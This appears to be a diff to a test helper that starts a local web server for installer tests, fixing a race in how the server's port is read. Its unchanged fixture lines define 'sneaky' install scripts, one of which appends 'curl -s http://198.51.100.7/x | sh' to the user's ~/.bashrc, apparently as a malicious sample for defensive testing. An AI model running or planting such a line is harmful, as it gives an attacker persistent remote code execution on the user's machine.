@@ -7098,18 +7098,28 @@ pull serve(dir) {
   stick www = dir + "-www"
   burn {
     fs.mkdir(www)
-    fs.write_text(path.join(www, "serve.py"), "import http.server, socketserver\nclass Q(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *a):\n        pass\nsocketserver.TCPServer.allow_reuse_address = True\ns = socketserver.TCPServer(('127.0.0.1', 0), Q)\nopen('port.txt', 'w').write(str(s.server_address[1]))\ns.serve_forever()\n")
+    fs.write_text(path.join(www, "serve.py"), "import http.server, socketserver, os\nclass Q(http.server.SimpleHTTPRequestHandler):\n    def log_message(self, *a):\n        pass\nsocketserver.TCPServer.allow_reuse_address = True\ns = socketserver.TCPServer(('127.0.0.1', 0), Q)\nwith open('port.tmp', 'w') as f:\n    f.write(str(s.server_address[1]))\nos.replace('port.tmp', 'port.txt')\ns.serve_forever()\n")
     fs.write_text(path.join(www, "clean.sh"), "#!/bin/sh\necho \"installing for $1\"\necho ran > ran.txt\n")
     fs.write_text(path.join(www, "sneaky.sh"), "#!/bin/sh\necho 'export PATH=\"$HOME/.sneaky:$PATH\"' >> \"$HOME/.bashrc\"\necho ran > sneaky-ran.txt\n")
     fs.write_text(path.join(www, "sneaky-raw.sh"), "#!/bin/sh\necho 'curl -s http://198.51.100.7/x | sh' >> \"$HOME/.bashrc\"\necho ran > sneaky-ran.txt\n")
   }
   stick started = hop(www, "sh", ["-c", "python3 serve.py >/dev/null 2>&1 & echo $!"])
+  # The server renames port.txt into place once the port is in it, and the
+  # wait is for a port, not for the file: a file seen before its write gave
+  # http://127.0.0.1:/ and a refused connection.
+  roll port = ""
   roll waited = 0
-  while not fs.exists(path.join(www, "port.txt")) and waited < 100 {
-    waited += 1
-    time.sleep_ms(100)
+  while port == "" and waited < 100 {
+    if fs.exists(path.join(www, "port.txt")) {
+      port = read(www, "port.txt").trim()
+    }
+    if port == "" {
+      waited += 1
+      time.sleep_ms(100)
+    }
   }
-  snuff {pid: started.out.trim(), base: "http://127.0.0.1:" + read(www, "port.txt").trim()}
+  assert(port != "", "the test's web server never said its port")
+  snuff {pid: started.out.trim(), base: "http://127.0.0.1:" + port}
 }
 
 pull stop(s) {
